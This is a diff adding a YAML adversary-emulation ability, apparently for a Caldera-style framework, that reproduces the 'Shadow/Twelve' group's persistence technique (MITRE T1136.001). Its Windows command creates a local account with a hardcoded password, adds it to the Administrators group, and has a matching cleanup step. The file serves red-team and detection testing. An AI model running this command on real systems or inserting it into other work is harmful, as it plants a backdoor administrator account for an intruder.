@@ -1,0 +1,13 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaas
+  name: "[SHADOW-TWELVE] Local Admin-user creation"
+  description: "Для сохранения доступа к внутреннему периметру жертв Shadow создает локальные и доменные учетные записи"
+  tactic: persistence
+  technique:
+    attack_id: T1136.001
+    name: "Create Account: Local Account"
+  platforms:
+    windows:
+      cmd:
+        cleanup: net user /del "Local_Admin_User"
+        command: net user /add Local_Admin_User Astra12345678! & net localgroup Администраторы Local_Admin_User /add
+        timeout: 120
